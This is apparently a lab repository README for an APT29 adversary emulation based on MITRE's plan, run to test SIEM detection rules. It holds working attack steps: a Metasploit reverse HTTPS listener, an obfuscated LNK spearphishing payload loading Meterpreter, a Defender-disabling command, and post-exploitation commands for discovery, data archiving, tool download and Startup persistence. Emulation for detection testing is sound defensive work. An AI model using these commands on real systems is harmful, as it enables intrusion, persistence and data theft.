# APT29 Emulation — Cozy Bear

This directory documents the APT29 emulation executed in this lab. The emulation scripts are based on the official MITRE Center for Threat-Informed Defense plan and were tested and validated in the environment described in this repository.

---

## Script Origin

The emulation scripts are derived from the official MITRE repository:

**APT29 Adversary Emulation Plan**
[https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29)

The emulation documented here uses specifically **Lab 4.3 — Automating TTPs** from the MAD20 plan, which automates the Initial Access vector via a malicious LNK file delivered by spearphishing.

---

## Prerequisites

### Required software on Kali-Attack

```bash
# Metasploit
msfconsole --version

# Python3 and dependencies
pip3 install pylnk3 pefile

# PyFuscation (included in MITRE repository)
# evillnk (included in MITRE repository)
```

### WIN-DC01 state

Before running confirm that WIN-DC01 has:

- Wazuh Agent active and sending logs to SOC-Core
- Sysmon64 running with Olaf config
- Windows Defender disabled (lab environment)
- PowerShell Script Block Logging active
- Process Creation Auditing active (Event 4688)

---

## Initial Setup — Clone the MITRE repository

```bash
# On Kali, clone the official MITRE repository
cd ~/
git clone https://github.com/center-for-threat-informed-defense/adversary_emulation_library.git

# Navigate to Lab 4.3
cd adversary_emulation_library/apt29/Emulation_Plan/Scenario_1/

# Verify structure
ls -la
```

The Lab 4.3 structure you will use is:

```
lab_4.3/
├── auto-lnk.sh                         ← Main automation script
├── resources/
│   ├── ds7002.pdf                      ← Dummy PDF (lure)
│   ├── loader_template.ps1             ← PowerShell loader template
│   └── stage1_command_template.ps1     ← PowerShell stage1 template
├── scripts/
│   ├── cleanup.sh                      ← Removes previous artifacts
│   ├── handler.rc                      ← Metasploit listener config
│   ├── prep-automation.sh              ← Generates Meterpreter DLL via msfvenom
│   ├── setup_servers.sh                ← Starts HTTP server and listener
│   └── shutdown_servers.sh             ← Stops the servers
└── tools/
    ├── append_file_with_enc.py         ← Appends files to LNK
    ├── configs.py                      ← Payload configuration
    ├── evillnk.py                      ← LNK file generator
    ├── lnk_payload.py                  ← Main payload script
    ├── PSconfig.ini                    ← PyFuscation config
    └── PyFuscation.py                  ← PowerShell script obfuscator
```

---

## Step-by-step execution

### Step 1 — Start the Metasploit listener

Open a terminal on Kali and start the listener:

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_https; \
  set LHOST 192.168.10.102; \
  set LPORT 443; \
  set ExitOnSession false; \
  run -j"
```

Wait until you see:
```
[*] Started HTTPS reverse handler on https://0.0.0.0:443
```

### Step 2 — Generate the LNK payload

Open a second terminal and navigate to the lab folder:

```bash
cd ~/adversary_emulation_library/apt29/Emulation_Plan/Scenario_1/lab_4.3/
chmod +x auto-lnk.sh
./auto-lnk.sh
```

The script automatically runs:

1. **cleanup.sh** — removes artifacts from previous runs
2. **prep-automation.sh** — detects local IP and generates `meterpreter.dll` via msfvenom
3. **lnk_payload.py** — creates the LNK file with obfuscated PowerShell payload and compresses to `ds7002.zip`

Expected output:
```
[+] Cleaning up previously existing artifacts
[+] Prepping required files
[+] Using Local IP Address: 192.168.10.102
[+] Creating the malicious LNK payload
[+] Payload created!
```

### Step 3 — Serve the payload via HTTP

```bash
cd ~/adversary_emulation_library/apt29/Emulation_Plan/Scenario_1/lab_4.3/
python3 -m http.server 8080
```

Expected output:
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

### Step 4 — Execute the payload on WIN-DC01

On WIN-DC01 open Microsoft Edge and navigate to:

```
http://192.168.10.102:8080/ds7002.zip
```

Download the file, extract the ZIP and execute the `ds7002.lnk` file.

The Meterpreter session should open on Kali within seconds:
```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: LAB\Administrator
```

### Step 5 — Execute TTPs in the Meterpreter session

With the active session execute the TTPs in the sequence documented in the [attack timeline](../02-attack-phases/attack-timeline-en.md):

```bash
# T1087 — Account Discovery
shell
net user /domain

# T1069 — Permission Groups Discovery
net group "Domain Admins" /domain

# T1082 — System Information Discovery
systeminfo

# T1057 — Process Discovery
tasklist

# T1012 — Registry Query
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion

# T1560 — Archive Collected Data
"C:\Program Files\7-Zip\7z.exe" a -tzip C:\Users\Public\data.zip C:\Users\Administrator\Documents\*

# T1105 — Ingress Tool Transfer
powershell.exe
Invoke-WebRequest -Uri "http://192.168.10.102:8080/ds7002.zip" -OutFile "C:\Users\Public\tool.zip"

# T1547.009 — Startup Persistence
Expand-Archive -Path "C:\Users\Administrator\Downloads\ds7002.zip" -DestinationPath "C:\Users\Administrator\Downloads\ds7002\" -Force
Copy-Item "C:\Users\Administrator\Downloads\ds7002\ds7002.lnk" "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## What happens in the SIEM

During execution the Wazuh Agent on WIN-DC01 captures all events and sends them to SOC-Core. The Elastic SIEM processes the events and triggers alerts from the 12 APT29 rules created via API.

To check alerts in real time open Kibana:

```
http://192.168.10.20:5601
Security -> Alerts
```

To deploy the detection rules before running the attack check:

```
../04-detection/README.md
```

---

## How the payload works internally

The LNK payload uses a multi-stage technique to evade detection:

**Stage 1** — The LNK file executes PowerShell with `-EncodedCommand` containing a Base64 obfuscated script with PyFuscation. Covers T1059.001 and T1027.

**Stage 2** — The stage1 script reads the loader script that is appended to the LNK file itself at offset `0x5e2be`. Covers T1027.

**Stage 3** — The loader script extracts the dummy PDF and Meterpreter DLL also appended to the LNK at offsets `0x3000` and `0x30000`, opens the PDF as a lure and loads the DLL via rundll32. Covers T1218.011.

**Stage 4** — The Meterpreter DLL establishes the reverse HTTPS connection to Kali on port 443. Covers T1071.001.

---

## TTPs covered

| TTP | Technique | Phase | Severity |
|---|---|---|---|
| T1566.002 | Spearphishing Link | Initial Access | High |
| T1204.002 | Malicious File LNK | Initial Access | High |
| T1059.001 | PowerShell Execution | Execution | High |
| T1027 | Obfuscation | Defense Evasion | High |
| T1218.011 | Rundll32 | Defense Evasion | High |
| T1071.001 | C2 HTTPS | Command and Control | High |
| T1087 | Account Discovery | Discovery | Medium |
| T1069 | Permission Groups | Discovery | Medium |
| T1082 | System Info | Discovery | Medium |
| T1057 | Process Discovery | Discovery | Medium |
| T1012 | Registry Query | Discovery | Medium |
| T1560 | Archive Collected Data | Collection | High |
| T1105 | Ingress Tool Transfer | Command and Control | High |
| T1547.009 | Startup Persistence | Persistence | High |

---

## Troubleshooting

**The payload closes immediately on WIN-DC01**

This happens when Windows Defender is active. Confirm Defender is disabled before running.

```powershell
# On WIN-DC01
Set-MpPreference -DisableRealtimeMonitoring $true
```

**The Meterpreter session does not open**

Confirm the listener is active on port 443 and WIN-DC01 can reach Kali:

```powershell
# On WIN-DC01
Test-NetConnection -ComputerName 192.168.10.102 -Port 443
```

**msfvenom fails to generate the DLL**

Confirm Metasploit is up to date:

```bash
msfupdate
```

---

## References

- [MITRE Center for Threat-Informed Defense — APT29 Emulation Plan](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29)
- [MAD20 Lab 4.3 — Automating TTPs](https://mad20.io/)
- [MITRE ATT&CK — APT29](https://attack.mitre.org/groups/G0016/)
- [Metasploit msfvenom Documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
